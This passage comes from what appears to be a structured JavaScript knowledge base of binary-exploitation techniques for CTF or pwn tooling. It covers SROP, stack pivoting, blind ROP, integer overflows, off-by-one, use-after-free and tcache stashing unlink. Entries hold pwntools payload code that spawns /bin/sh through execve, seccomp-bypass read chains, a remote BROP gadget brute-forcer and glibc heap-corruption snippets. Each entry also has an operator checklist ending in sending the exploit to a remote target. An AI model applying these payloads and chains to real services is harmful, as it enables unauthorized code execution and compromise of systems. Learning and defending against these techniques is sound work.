          'Build payload: padding + pop_rax + p64(15) + syscall_gadget + frame_bytes',
          'Send payload → overflow triggers pop_rax(15) → syscall(rt_sigreturn) → kernel restores frame → execve runs'
        ],
        tools: ['pwntools SigreturnFrame', 'ROPgadget', 'ropper'],
        codeSnippet: `frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = binsh_addr           # pointer to "/bin/sh"
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_gadget       # "syscall; ret"

payload = b'A' * offset
payload += p64(pop_rax_gadget)    # pop rax; ret
payload += p64(15)                # SYS_rt_sigreturn
payload += p64(syscall_gadget)    # invoke sigreturn
payload += bytes(frame)           # forged signal frame

p.send(payload)`,
        applicableLibc: 'All versions (kernel-level technique)',
        references: [
          { description: 'Sigreturn Oriented Programming - original paper', url: 'https://www.cs.vu.nl/~herbertb/papers/srop_sp14.pdf' },
          { tool: 'pwntools SigreturnFrame', description: 'Automatic sigreturn frame generation' }
        ]
      },
      {
        name: 'SROP → mprotect + shellcode',
        description: 'Use SROP to call mprotect(syscall 10) to make a memory region RWX, then pivot to shellcode.',
        steps: [
          'Stage 1 SROP frame: rax=10 (mprotect), rdi=page_base, rsi=0x1000, rdx=7 (RWX), rip=syscall; ret',
          'Set rsp in the frame to point to your shellcode address (mprotect returns to shellcode after syscall)',
          'Requires a separate SROP call; or use a "syscall" gadget that returns to shellcode after mprotect'
        ],
        tools: ['pwntools', 'ROPgadget'],
        codeSnippet: `frame = SigreturnFrame()
frame.rax = constants.SYS_mprotect
frame.rdi = shellcode_page & ~0xfff  # page-align
frame.rsi = 0x1000
frame.rdx = 7                         # PROT_READ|WRITE|EXEC
frame.rip = syscall_gadget
frame.rsp = shellcode_addr`,
        applicableLibc: 'All versions',
        references: [
          { description: 'SROP + mprotect technique' }
        ]
      },
      {
        name: 'SROP → ORW Chain (open/read/write)',
        description: 'Use multiple consecutive SROP calls to perform file I/O when execve is blocked by seccomp.',
        steps: [
          'Stage 1: SROP for open("flag", O_RDONLY). rax=2, rdi=&"flag", rsi=0',
          'Set rip in frame to the next SROP gadget (syscall + pop_rax + sigreturn) so it chains to Stage 2',
          'Stage 2: SROP for read(fd=3, buf, 0x100). rax=0, rdi=3, rsi=buf, rdx=0x100',
          'Stage 3: SROP for write(1, buf, 0x100). rax=1, rdi=1, rsi=buf, rdx=0x100'
        ],
        tools: ['pwntools SigreturnFrame', 'seccomp-tools'],
        applicableLibc: 'All versions',
        references: [
          { description: 'SROP ORW chain for seccomp bypass' }
        ]
      }
    ],

    postconditions: {
      successIndicators: [
        'All 15 general-purpose registers set to attacker-controlled values in one step',
        'No need for complex ROP gadget chains — single frame replaces hundreds of bytes of ROP',
        'Shell spawned via execve, or mprotect RWX + shellcode, or ORW flag read'
      ],
      artifacts: [
        'Forged sigreturn frame structure on the stack',
        'rax=15 syscall invocation in GDB trace'
      ]
    },

    operatorChecklist: [
      '[ ] Verify "syscall; ret" gadget exists in binary or libc',
      '[ ] Find "pop rax; ret" gadget (or equivalent: xor eax,eax; inc eax; etc.)',
      '[ ] Calculate exact offset to RIP overwrite via cyclic pattern',
      '[ ] Confirm seccomp does not block rt_sigreturn (syscall 15)',
      '[ ] Create SigreturnFrame via pwntools with desired register state',
      '[ ] Build payload: padding + pop_rax_15 + syscall + frame.bytes()',
      '[ ] If execve is blocked by seccomp, design ORW SROP chain instead',
      '[ ] Test locally in GDB: set breakpoint at "syscall" and inspect registers post-sigreturn',
      '[ ] Send to remote target'
    ],

    vulnerabilityTypes: ['stack', 'srop'],
    references: [
      { tool: 'pwntools', description: 'SigreturnFrame class for automated frame generation' },
      { description: 'SROP: Exploiting the Processor using Signals', url: 'https://www.cs.vu.nl/~herbertb/papers/srop_sp14.pdf' },
      { description: 'SROP in CTF Challenges', url: 'https://ctf101.org/binary-exploitation/sigreturn-oriented-programming/' }
    ]
  },

  stack_pivot: {
    id: 'stack_pivot',
    name: 'Stack Pivot',
    category: 'technique',
    class: 'stack-pivot',
    description: 'Relocates the stack pointer (RSP) from the real stack to an attacker-controlled memory region (heap, BSS, or libc data). This is essential when the overflow is too small to hold a full ROP chain, but you can redirect RSP to a larger, controlled buffer.',

    preconditions: {
      summary: 'An overflow too small for a complete ROP chain, plus a writable region where a secondary payload can be pre-placed.',
      required: [
        'Stack buffer overflow or format string giving RIP control, but overflow length is limited (e.g., < 40 bytes after RIP)',
        'Writable memory region at a known or leaked address (heap buffer, .bss, libc data section)',
        'A "leave; ret" gadget (most common pivot), or "xchg rsp, rax; ret", or "pop rsp; ret" gadget',
        'Secondary chain pre-written to the pivot destination via earlier I/O or allocation'
      ],
      detectionSteps: [
        'Check overflow size: how many bytes past RIP can you control? If < 100, pivot is likely needed',
        'In GDB: vmmap → find writable regions (heap, .bss, libc writable) — leak or calculate their address',
        'Find pivot gadgets: ROPgadget --binary ./binary | grep -E "leave.*ret|xchg.*rsp|pop rsp"'
      ],
      offsetDiscovery: {
        'leave;ret pivot': 'Set RBP on overflow to fake_rbp = target_addr - 8; "leave" = mov rsp,rbp; pop rbp → RSP = target_addr; then "ret" pops new RIP from there',
        'xchg pivot': 'Control RAX = target_addr; xchg rsp,rax → RSP = target_addr; ret pops RIP from new stack'
      }
    },

    exploitationPaths: [
      {
        name: 'leave;ret Pivot (Classic)',
        description: 'Most common pivot technique. Overwrite saved RBP with a fake frame pointer to redirect RSP via leave;ret.',
        steps: [
          'Place secondary ROP chain at a known writable address (e.g., heap buffer, .bss, or stack frame below)',
          'Overflow the primary buffer: set saved RBP = pivot_destination - 8, set saved RIP = leave;ret gadget',
          'On function epilogue: "leave" → mov rsp,rbp (RSP now points to the fake frame) → pop rbp (pops your fake_rbp+8) → RSP now at your fake frame',
          'Then "ret" pops the first gadget of your secondary chain from the pivot destination',
          'The secondary ROP chain now executes entirely from the fake stack'
        ],
        tools: ['ROPgadget (find leave;ret)', 'pwndbg vmmap'],
        codeSnippet: `# Primary overflow (limited size):
payload = b'A' * offset_to_rbp
payload += p64(fake_rbp)           # pivot_dest - 8
payload += p64(leave_ret_gadget)   # leave; ret

# Secondary chain (placed at pivot_dest earlier):
second_payload = p64(pop_rdi) + p64(binsh) + p64(system)

# Pre-write secondary chain to heap/BSS:
p.sendlineafter(b'data:', second_payload) 

# Now trigger overflow with pivot:
p.sendlineafter(b'name:', payload)`,
        references: [
          { description: 'Stack Pivoting - CTF Wiki', url: 'https://ctf-wiki.mahaloz.re/pwn/linux/stackoverflow/others/#stack-pivoting' }
        ]
      },
      {
        name: 'xchg rsp,rax Pivot',
        description: 'Use an xchg gadget to swap RSP into a controlled register (RAX typically) and redirect the stack.',
        steps: [
          'Find "xchg rax, rsp; ret" or "xchg rsp, rax; ret" gadget',
          'Control RAX value (via "pop rax; ret" in the limited overflow) to point to your fake stack',
          'Chain: pop rax; ret → xchg rsp,rax; ret → execution continues from fake stack'
        ],
        tools: ['ROPgadget', 'ropper'],
        references: [
          { description: 'xchg pivot technique' }
        ]
      },
      {
        name: 'pop rsp; ret Pivot (Direct)',
        description: 'The simplest pivot: directly overwrite RSP with a gadget that pops RSP from the stack.',
        steps: [
          'Find "pop rsp; ret" gadget (rare but powerful)',
          'Payload: padding + pop_rsp + p64(fake_stack_addr) → RSP jumps to fake stack on ret'
        ],
        tools: ['ROPgadget', 'ropper'],
        references: []
      }
    ],

    postconditions: {
      successIndicators: [
        'RSP register redirected to a non-stack memory region',
        'ROP chain executing from heap/BSS/libc writable memory',
        'Full-length ROP chain succeeds despite limited primary overflow'
      ],
      artifacts: [
        'GDB: info registers rsp → shows address in heap or .bss instead of stack'
      ]
    },

    operatorChecklist: [
      '[ ] Measure exact byte count available past RIP (is it < ~100 bytes?)',
      '[ ] Identify a writable, known-address region for the secondary payload',
      '[ ] Pre-place the secondary ROP chain at the pivot destination',
      '[ ] Find a leave;ret or xchg rsp,reg gadget',
      '[ ] Calculate fake_rbp = pivot_dest - 8 for leave;ret pivot',
      '[ ] Build primary payload: padding + fake_rbp + pivot_gadget',
      '[ ] Test in GDB: watch RSP change after the leave;ret or xchg',
      '[ ] Verify secondary chain gadgets have valid addresses in the new context'
    ],

    vulnerabilityTypes: ['stack', 'pivot'],
    references: [
      { description: 'Stack Pivot Tutorial', url: 'https://ir0nstone.gitbook.io/notes/binexp/stack/stack-pivoting' },
      { tool: 'ROPgadget', description: 'Find leave;ret and xchg gadgets' }
    ]
  },

  brop_exploit: {
    id: 'brop_exploit',
    name: 'Blind Return Oriented Programming (BROP)',
    category: 'technique',
    class: 'brop',
    description: 'Exploits a remote forking server to progressively brute-force ROP gadgets without any binary or library access. The key insight: in a forking server, the same binary image is shared across child processes, so you can probe for gadgets byte-by-byte by observing server responses (crash vs. no crash).',

    preconditions: {
      summary: 'A remote service that forks on each connection, has a stack buffer overflow, and you have zero access to the binary or libc.',
      required: [
        'Stack buffer overflow in a forking server (each connection = new child process with same address space)',
        'Server MUST restart cleanly after crash (fork model ensures this)',
        'PIE is off (or the binary base is fixed — BROP can bruteforce PIE too but it is much harder)',
        'NX is enabled (otherwise simple shellcode would work)',
        'No stack canary, or canary is bruteforceable in the fork model',
        'The stop gadget (a reliable "does-not-crash" address) must be findable'
      ],
      detectionSteps: [
        'Test: send a long input → does server crash/close? If yes and it stays up for reconnection, fork model confirmed',
        'Test: can you detect crash vs non-crash responses? (e.g., connection close = crash, reading a response = no crash)',
        'Run BROP scanner script to automatically discover gadgets'
      ]
    },

    exploitationPaths: [
      {
        name: 'Full BROP Gadget Discovery + Dump',
        description: 'The complete BROP workflow: find stop gadget, find BROP gadget (pop rdi; ret), find PLT entries, dump binary.',
        steps: [
          'Phase 1 — Find Stop Gadget: Brute-force addresses by sending padding+addr. If server returns data (no crash), the address likely points to a "ret" or benign instruction. Collect all non-crashing addresses.',
          'Phase 2 — Find BROP Gadget (pop rdi; ret): After finding the stop gadget at addr_s, probe addresses addr_x by sending: padding + addr_x + arg + addr_s. If the server does not crash, addr_x is a "pop rdi; ret" (it pops arg off the stack and returns to stop).',
          'Phase 3 — Find PLT entries: With known pop_rdi, probe for puts@plt by sending: pop_rdi + candidate_got + candidate_plt. If the server returns recognizable data (like libc bytes), candidate_plt is puts@plt.',
          'Phase 4 — Dump Binary: Use puts@plt to read the entire binary text section page by page. Identify more gadgets, GOT entries, and string tables.',
          'Phase 5 — Exploit: Use leaked binary/libraries to build a complete ROP chain for ret2libc or shell spawning.'
        ],
        tools: ['pwntools (BROP automation)', 'custom BROP scanner scripts'],
        codeSnippet: `# BROP Stop Gadget Finder (simplified):
def find_stop_gadget(start_addr, end_addr, step=1):
    stops = []
    for addr in range(start_addr, end_addr, step):
        try:
            p = remote(host, port)
            payload = b'A' * offset + p64(addr)
            p.send(payload)
            if p.can_recv(timeout=2):  # server didn't crash
                stops.append(addr)
            p.close()
        except:
            pass
    return stops

# Find pop rdi (BROP gadget):
def find_pop_rdi(stop_addr, candidates, arg=0xdeadbeef):
    pop_rdi = []
    for addr in candidates:
        try:
            p = remote(host, port)
            payload = b'A' * offset + p64(addr) + p64(arg) + p64(stop_addr)
            p.send(payload)
            if p.can_recv(timeout=2):
                pop_rdi.append(addr)
            p.close()
        except:
            pass
    return pop_rdi`,
        references: [
          { description: 'Original BROP Paper (Stanford)', url: 'https://www.scs.stanford.edu/brop/' },
          { description: 'BROP CTF Tutorial', url: 'https://ctf101.org/binary-exploitation/blind-return-oriented-programming/' }
        ]
      }
    ],

    postconditions: {
      successIndicators: [
        'Binary image fully dumped from remote service without any prior knowledge',
        'libc version identified from leaked addresses and offsets',
        'Full ROP chain built and shell obtained'
      ],
      artifacts: [
        'Dumped .text section of the remote binary',
        'List of discovered gadgets at specific offsets'
      ]
    },

    operatorChecklist: [
      '[ ] Confirm remote service is a forking server (stays up after crash)',
      '[ ] Verify PIE is off (or factor in PIE bruteforce time)',
      '[ ] Find overflow offset using sequential probing',
      '[ ] Brute-force stop gadget (all non-crashing addresses)',
      '[ ] From stop gadgets, find BROP gadget (pop rdi; ret)',
      '[ ] Scan for PLT entries (puts, write, printf) using BROP gadget',
      '[ ] Dump binary .text section via puts@plt',
      '[ ] Analyze dumped binary to find more gadgets and libc pointers',
      '[ ] Build final ROP chain using discovered addresses',
      '[ ] Send exploit to remote'
    ],

    vulnerabilityTypes: ['stack', 'brop'],
    references: [
      { description: 'BROP: Automatically ROPping for Remote Exploitation', url: 'https://www.scs.stanford.edu/brop/bittau-brop.pdf' },
      { description: 'BROP on CTF101', url: 'https://ctf101.org/binary-exploitation/blind-return-oriented-programming/' }
    ]
  },

  integer_exploit_techniques: {
    id: 'integer_exploit_techniques',
    name: 'Integer Overflow & Underflow Exploitation',
    category: 'technique',
    class: 'integer-exploits',
    description: 'Exploits arithmetic wraparound bugs where integer calculations overflow or underflow, resulting in undersized buffer allocations, negative lengths treated as huge unsigned values, or incorrect size checks that enable buffer overflows.',

    preconditions: {
      summary: 'Arithmetic on user-controlled integers is performed without overflow checks, leading to memory corruption.',
      required: [
        'User-controlled numeric input (size, length, index) used in allocation or bounds checking',
        'Arithmetic involving user-controlled values: addition, subtraction, multiplication, or casting',
        'No overflow/saturation checks in the arithmetic path',
        'A subsequent operation (malloc, memcpy, read, loop boundary) that depends on the corrupted result'
      ],
      detectionSteps: [
        'Search for arithmetic on sizes: grep for "malloc\(.*\+.*\)" or "malloc\(.*\*.*\)" in decompiled code',
        'Test edge cases: send 0xFFFFFFFF, 0x80000000, -1, 0, and watch allocation sizes in ltrace',
        'In GDB: set breakpoint on malloc → observe allocation size argument',
        'Look for signed/unsigned mismatches: if (len < MAX) where len is signed int and MAX is small',
        'Test negative values: if the program accepts signed integers, send -1 → might become 0xFFFFFFFF when cast to size_t'
      ]
    },

    exploitationPaths: [
      {
        name: 'Integer Overflow → Heap Buffer Overflow',
        description: 'Overflow the size calculation for malloc, causing a too-small allocation that triggers a heap overflow when data is copied.',
        steps: [
          'Identify allocation: size = user_size + constant → if user_size = 0xFFFFFFFF, size wraps to constant-1',
          'Result: malloc(small_size) returns a small buffer, but the program copies user_size bytes (huge) into it',
          'Overflow corrupts adjacent heap metadata, enabling standard heap exploitation',
          'Target: next chunk\'s size field, fd/bk pointers, or application data'
        ],
        tools: ['GDB', 'pwntools', 'ltrace'],
        codeSnippet: `# User sends a huge size that wraps:
size_t user_size = get_user_input();  # e.g., 0xFFFFFFFF
size_t alloc_size = user_size + 0x10; # wraps to 0xF (tiny)
char *buf = malloc(alloc_size);       # allocates only 15 bytes
read(0, buf, user_size);              # reads 4GB into 15-byte buffer!`,
        applicableLibc: 'All versions',
        references: [
          { description: 'Integer Overflow Exploitation', url: 'https://ctf101.org/binary-exploitation/integer-overflow/' }
        ]
      },
      {
        name: 'Integer Underflow → Large Size Pass',
        description: 'Subtract from a user-controlled value to underflow, making size-1 wrap to 0xFFFFFFFF.',
        steps: [
          'Example: user_size = 0; check: if (user_size - 1 > MAX) fail → 0 - 1 = 0xFFFFFFFF > MAX, so check FAILS',
          'Result: size-1 is huge, but the original size=0 bypassed the check',
          'The large value is passed to read/memcpy → massive heap/stack overflow'
        ],
        tools: ['GDB', 'python for quick fuzzing'],
        references: [
          { description: 'Integer Underflow CTF Examples' }
        ]
      },
      {
        name: 'Sign Extension → Type Confusion',
        description: 'A small negative signed value (e.g., char -1 = 0xFF) is implicitly cast to a larger unsigned type (e.g., size_t), becoming 0xFFFFFFFF.',
        steps: [
          'Find: char length = get_user_byte();  // user sends 0xFF (-1 as signed char)',
          'Cast: int total = length + header_size;  // length is sign-extended to 0xFFFFFFFF',
          'if (total < MAX) → 0xFFFFFFFF < MAX? Probably passes!',
          'memcpy(dst, src, total) → copies 4GB into a small buffer'
        ],
        tools: ['Ghidra/IDA (look for C casts from int8_t → size_t)', 'pwntools'],
        references: [
          { description: 'Type Juggling and Sign Extension Bugs' }
        ]
      },
      {
        name: 'Negative Index → Out-of-Bounds Access',
        description: 'Using a negative signed integer as an array index, which wraps to a huge unsigned offset that lands outside the buffer.',
        steps: [
          'Find: int idx = get_user_input(); arr[idx] = value;',
          'Send idx = -1 → accesses arr[-1] = arr[max_size_t], effectively a backward OOB write',
          'This can overwrite saved variables, heap metadata, or security-critical flags on the stack'
        ],
        tools: ['GDB', 'pwntools'],
        references: [
          { description: 'Negative Array Index Exploit' }
        ]
      }
    ],

    postconditions: {
      successIndicators: [
        'Allocation size smaller than intended → heap corruption',
        'Negative value bypasses size check → huge copy operation',
        'Buffer overflow achieved via arithmetic wraparound'
      ],
      artifacts: [
        'GDB: malloc called with size = 0x0000000F (wrapped) or similar tiny value',
        'Segfault at memcpy/read with huge count argument'
      ]
    },

    operatorChecklist: [
      '[ ] Search decompiled code for arithmetic on user input before malloc/memcpy',
      '[ ] Test 0xFFFFFFFF, 0x80000000, 0x7FFFFFFF as size inputs',
      '[ ] Test -1 (0xFFFFFFFF as signed) and 0 for edge cases',
      '[ ] Check if size_t or unsigned int is used (wrapping behavior)',
      '[ ] In IDA/Ghidra, look for IMUL, ADD, SUB before memory operations',
      '[ ] Use ltrace to observe actual malloc sizes vs. user input',
      '[ ] Fuzz with random integer values to identify wraparound points',
      '[ ] Once overflow confirmed, apply standard heap/stack exploitation'
    ],

    vulnerabilityTypes: ['integer', 'overflow', 'underflow'],
    references: [
      { tool: 'ltrace', description: 'Trace library calls to observe allocation sizes' },
      { description: 'Integer Overflow on CTF Wiki', url: 'https://ctf-wiki.mahaloz.re/pwn/linux/integeroverflow/intof/' },
      { description: 'CWE-190: Integer Overflow or Wraparound', url: 'https://cwe.mitre.org/data/definitions/190.html' }
    ]
  },

  off_by_one_exploit: {
    id: 'off_by_one_exploit',
    name: 'Off-By-One Exploitation',
    category: 'technique',
    class: 'off-by-one',
    description: 'Exploits a single-byte overflow past a buffer boundary. Despite only controlling one byte, this can corrupt critical metadata like the saved RBP LSB on the stack or the PREV_INUSE bit and prev_size of heap chunks, enabling stack pivoting or heap coalescing attacks.',

    preconditions: {
      summary: 'A loop or copy operation writes exactly one byte past the end of a buffer.',
      required: [
        'Loop condition i <= size instead of i < size, or strcpy with off-by-one strncpy size, or similar boundary error',
        'The byte after the buffer must be attacker-controllable (not zeroed and not write-protected)',
        'On the stack: saved RBP or canary byte lies immediately after the buffer',
        'On the heap: the next chunk\'s size field (specifically the PREV_INUSE bit and/or prev_size field) is adjacent'
      ],
      detectionSteps: [
        'Static: look for for(int i=0; i<=len; i++) or read(0,buf, len+1) patterns',
        'Test: send exactly buffer_size+1 bytes → check for segfault or heap corruption',
        'In GDB: examine memory layout around the buffer — what does byte buffer[buf_size] touch?'
      ]
    },

    exploitationPaths: [
      {
        name: 'Off-by-One on Stack → Saved RBP Corruption → Stack Pivot',
        description: 'Overwrite the LSB of saved RBP, redirecting the caller\'s frame to attacker-controlled data.',
        steps: [
          'On function epilogue: "leave" = mov rsp,rbp; pop rbp → RSP points to the corrupted frame',
          'The attacker places a fake frame (with controlled return address) where the corrupted RBP now points',
          'When the caller returns, it uses the fake frame → RIP hijacked to attacker-chosen gadget',
          'Single LSB overwrite limits the target to ±128 bytes from original RBP — you need to place a ROP chain within range'
        ],
        tools: ['GDB', 'pwntools'],
        codeSnippet: `# Stack off-by-one: overwrite saved RBP LSB
payload = b'A' * buffer_size          # fill buffer
payload += b'\\x00'                   # overwrite LSB of saved RBP (set to 0)
# Or: payload += b'\\x??'             # redirect to specific offset

# In the caller's stack frame, place a fake frame:
# fake_rbp + 8 = address of next gadget/ret address
# fake_rbp + 0 = next fake_rbp value`,
        references: [
          { description: 'Off-by-One Stack Exploitation', url: 'https://ctf-wiki.mahaloz.re/pwn/linux/stackoverflow/others/#off-by-one' }
        ]
      },
      {
        name: 'Off-by-One on Heap → NULL Byte Poisoning → House of Einherjar',
        description: 'Overwrite the PREV_INUSE bit of the next chunk to 0, forcing backward consolidation on free() with a fake prev_size.',
        steps: [
          'Allocate chunks A, B, C. Buffer in A overflows by 1 byte into B\'s size field, clearing the PREV_INUSE bit (lowest bit)',
          'Set A\'s prev_size field (or B\'s if the overflow reaches it) to the distance between A and a fake chunk you forged inside A',
          'Free(B) → allocator checks B->prev_inuse == 0 → consolidates backward by B->prev_size → fake chunk is now in unsorted bin',
          'Allocate a new chunk that overlaps with B (now freed) → arbitrary write via overlapping chunk primitive'
        ],
        tools: ['pwndbg vis_heap_chunks', 'pwntools'],
        codeSnippet: `# Off-by-one NULL byte into next chunk's PREV_INUSE
chunk_a = malloc(0xf8)   # 0x100 chunk
chunk_b = malloc(0x108)  # 0x110 chunk
chunk_c = malloc(0x88)   # guard chunk (prevents top chunk coalesce)

# Forge fake chunk inside A
fake_chunk = chunk_a + 0x?? 
*(fake_chunk) = 0x91     # fake size

# Overflow from A into B's size field
# B's original size: 0x111 → after NULL byte: 0x100 (PREV_INUSE cleared!)
*(chunk_a + 0xf8) = 0x00

# Set prev_size to point to fake chunk
*(chunk_b + 0x8) = 0x??  # distance = chunk_b - fake_chunk

free(chunk_b)  # backward consolidate → fake chunk in unsorted bin
malloc(0x100)  # overlapping allocation`,
        references: [
          { description: 'House of Einherjar / Poisoned NUL byte', url: 'https://heap-exploitation.dhavalkapil.com/attacks/house_of_einherjar' }
        ]
      },
      {
        name: 'Off-by-One → Canary Byte Leak (Null Byte)',
        description: 'If a buffer is immediately followed by the canary whose first byte is always 0x00, an off-by-one write of 0x00 into the buffer spills a non-null canary byte into the output.',
        steps: [
          'Fill buffer to max capacity; the buffer\'s null terminator overwrites the canary\'s inherent 0x00 LSB',
          'Print/leaking buffer now dumps the canary\'s full 8 bytes (since there\'s no 0x00 to stop at)',
          'Use leaked canary to fix up a subsequent buffer overflow payload'
        ],
        tools: ['pwntools', 'pwndbg'],
        references: [
          { description: 'Canary leak via off-by-one' }
        ]
      }
    ],

    postconditions: {
      successIndicators: [
        'Stack frame pivot achieved with a single-byte RBP overwrite',
        'Heap chunks consolidated unexpectedly via PREV_INUSE clear',
        'Canary or PIE base leaked via off-by-one into leak primitive'
      ],
      artifacts: [
        'GDB: corrupted prev_size or chunk size LSB in heap visualization',
        'RSP redirected from expected stack frame'
      ]
    },

    operatorChecklist: [
      '[ ] In decompiled code: find <= in loop conditions or unguarded strncpy',
      '[ ] Determine what byte lies immediately after the buffer (stack: saved RBP LSB, heap: next chunk size)',
      '[ ] Stack: calculate where a fake frame can be placed within ±128 bytes of corrupted RBP',
      '[ ] Stack: set LSB to redirect RBP into a controlled buffer area',
      '[ ] Heap: forge fake chunk with valid size inside a preceding allocation',
      '[ ] Heap: overwrite PREV_INUSE bit + prev_size of trailing chunk',
      '[ ] Trigger free() on the trailing chunk to consolidate',
      '[ ] Exploit overlapping chunk primitive for arbitrary write'
    ],

    vulnerabilityTypes: ['stack', 'heap', 'off-by-one'],
    references: [
      { description: 'Off-by-One Vulnerabilities', url: 'https://ctf101.org/binary-exploitation/off-by-one/' },
      { description: 'Poisoned NUL Byte Attack', url: 'https://heap-exploitation.dhavalkapil.com/attacks/house_of_einherjar' }
    ]
  },

  use_after_free_detailed: {
    id: 'use_after_free_detailed',
    name: 'Use-After-Free (UAF)',
    category: 'technique',
    class: 'uaf',
    description: 'A dangling pointer continues to be used after the memory it points to has been freed. If an attacker can reallocate that freed memory with controlled data before the dangling pointer is used, they can corrupt program state, hijack function pointers, or achieve arbitrary read/write.',

    preconditions: {
      summary: 'A pointer is freed but not nullified, and the program later dereferences it. An attacker must be able to allocate a new object of the same size in the freed slot.',
      required: [
        'free(p) is called, but p is not set to NULL afterward (dangling pointer)',
        'Later code dereferences p (reads from or writes to *p)',
        'Attacker can trigger an allocation (malloc/calloc/new) of the same size class between the free and the use',
        'The reallocation\'s content is partially or fully attacker-controlled'
      ],
      detectionSteps: [
        'Static: look for free() calls without subsequent NULL assignment in Ghidra/IDA',
        'Dynamic: set GDB watchpoint on the freed chunk — does any code touch it after free?',
        'In pwndbg: use the "bins" command to see freed chunks; then "x/gx freed_addr" after the supposed-free to check usage',
        'Fuzzing: after triggering free, send controlled data to reallocation paths, then trigger the use path'
      ]
    },

    exploitationPaths: [
      {
        name: 'UAF → vtable/Function Pointer Hijack',
        description: 'The freed object contains a vtable pointer or function pointer. Overwrite it with a controlled allocation to redirect execution.',
        steps: [
          'Free an object that contains a vtable pointer (in its first 8 bytes)',
          'Allocate attacker-controlled data of the same size → overwrites the freed object\'s memory, including the old vtable pointer',
          'Use the dangling pointer to call a virtual method → jumps to the attacker-controlled vtable entry',
          'Points vtable entry to system(), one_gadget, or a ROP chain'
        ],
        tools: ['pwndbg heap', 'pwntools', 'GDB'],
        codeSnippet: `// C++ UAF vtable hijack
Object *obj = new Object();
delete obj;          // obj is dangling, memory goes to tcache/fastbin

char *fake = (char*)malloc(sizeof(Object));
strcpy(fake, controlled_data);
*(void**)(fake) = fake_vtable;   // overwrite vtable ptr in freed slot

obj->virtual_method();  // UAF: calls *(fake_vtable + method_offset)`,
        applicableLibc: 'All versions',
        references: [
          { description: 'UAF Exploitation Guide', url: 'https://ctf101.org/binary-exploitation/use-after-free/' }
        ]
      },
      {
        name: 'UAF → Overlapping Objects → Arbitrary R/W',
        description: 'Reallocate a freed chunk with a different object type, creating a type confusion between the old and new objects.',
        steps: [
          'Free chunk A (size X, contains pointers)',
          'Allocate chunk B of size X with different semantics (e.g., string buffer instead of object)',
          'Chunk B overlaps with the old memory of A — the dangling pointer to A now reads/writes B\'s data',
          'If A contained a length field and B writes controlled data there, you can forge size fields for OOB access',
          'Alternatively, if B contains pointers, reading via the dangling A pointer leaks heap addresses'
        ],
        tools: ['pwndbg heap', 'pwntools'],
        references: [
          { description: 'Type Confusion via UAF' }
        ]
      },
      {
        name: 'UAF → tcache/fastbin Metadata Corruption',
        description: 'Use the dangling pointer to corrupt freed chunk metadata (fd/bk pointers) while the chunk is in a bin.',
        steps: [
          'Free chunk → enters tcache or fastbin. The fd pointer now points to the next free chunk (or NULL)',
          'UAF write via dangling pointer: overwrite the fd pointer to point to a target address',
          'Allocate from the bin twice: first returns the original chunk, second returns the fake chunk at the target',
          'Write to the fake chunk = arbitrary memory write'
        ],
        tools: ['pwndbg bins', 'pwntools'],
        applicableLibc: '2.23-2.31 (without tcache safe-linking)',
        codeSnippet: `p1 = malloc(0x60)
free(p1)            # p1 in tcache
p2 = malloc(0x60)   # p2 == p1 (tcache returns same chunk)
# p1 is now dangling (same memory as p2)
*(uint64_t*)p1 = target_addr  # corrupt tcache fd via dangling p1
malloc(0x60)        # allocates p1 again
malloc(0x60)        # returns chunk at target_addr!`
      }
    ],

    postconditions: {
      successIndicators: [
        'Freed memory reallocated and controlled by attacker',
        'Virtual method dispatch redirected to attacker address',
        'Arbitrary allocation at chosen memory location'
      ],
      artifacts: [
        'GDB: freed chunk in tcache/fastbin with corrupted fd pointer',
        'Heap chunk overlapping with dangling pointer use'
      ]
    },

    operatorChecklist: [
      '[ ] Find free(p) call where p is not nullified',
      '[ ] Determine size class of the freed object',
      '[ ] Identify all code paths that dereference p after the free',
      '[ ] Find an allocation path of the same size class under attacker control',
      '[ ] For vtable hijack: calculate offset of the virtual method to be called',
      '[ ] For bin corruption: compute target address and safe-link XOR if needed',
      '[ ] Test locally: trigger free → allocate controlled → trigger use → verify crash at controlled address',
      '[ ] Escalate from arbitrary address access to code execution (one_gadget, system hook, etc.)'
    ],

    vulnerabilityTypes: ['heap', 'uaf'],
    references: [
      { description: 'How2Heap: UAF examples', url: 'https://github.com/shellphish/how2heap' },
      { description: 'CTF101: Use-After-Free', url: 'https://ctf101.org/binary-exploitation/use-after-free/' }
    ]
  },

  tcache_stashing_unlink_detailed: {
    id: 'tcache_stashing_unlink_detailed',
    name: 'Tcache Stashing Unlink Attack',
    category: 'technique',
    class: 'heap-technique',
    description: 'Exploits the tcache stashing mechanism in calloc() (which bypasses tcache) to unlink a corrupted chunk from smallbins. By corrupting the bk pointer of a smallbin chunk, an arbitrary write is achieved when calloc retrieves a chunk from the smallbin and stashes remaining chunks into tcache.',

    preconditions: {
      summary: 'calloc is used to allocate memory, which goes directly to smallbins (skipping tcache). If tcache for the requested size has < 2 free slots, calloc will cache remaining smallbin chunks into tcache, unlinking them — and a corrupted bk pointer triggers an arbitrary write.',
      required: [
        'calloc() is used (NOT malloc — malloc goes to tcache first, bypassing the stash path)',
        'Glibc 2.26-2.31 (tcache with stashing in calloc)',
        'Ability to corrupt the bk pointer of a smallbin chunk',
        'tcache for the target size must have at least 1 free slot but less than TCACHE_FILL_COUNT (7)',
        'Smallbin must have at least 2 chunks (the target + one valid chunk for the forward list)'
      ],
      detectionSteps: [
        'Run: objdump -d ./binary | grep calloc → verify calloc usage',
        'Check libc version: strings libc.so | grep "GNU C Library"',
        'In GDB: inspect smallbin via pwndbg "bins" command after freeing chunks',
        'Verify tcache count for the target size is between 1 and 6'
      ]
    },

    exploitationPaths: [
      {
        name: 'calloc → Smallbin → Corrupted bk → Arbitrary Write',
        description: 'The core stashing unlink — corrupt bk of a smallbin chunk to write a libc pointer (main_arena+X) to an arbitrary location.',
        steps: [
          'Set up: allocate and free enough chunks to populate a smallbin and leave tcache with 1-3 slots remaining',
          'Corrupt the bk pointer of the last chunk in the smallbin to point to target_addr - 0x10 (where 0x10 is the offset of the bk field within a malloc_chunk)',
          'calloc() is called for the smallbin size → calloc sees tcache is not full → retrieves one chunk from smallbin → then tries to stash remaining chunks into tcache',
          'During stashing, the corrupted bk is followed → smallbin->bk->fd = smallbin (the unlink write) → target_addr now contains a pointer into main_arena',
          'This is a "write-what-where" where the "what" is a libc address, useful for overwriting _IO_list_all or similar globals'
        ],
        tools: ['pwndbg bins', 'pwntools'],
        codeSnippet: `# Setup: fill tcache for size 0x100
for i in range(7):
    free(malloc(0x100))

# Create smallbin chunks
a = malloc(0x100)
b = malloc(0x100)
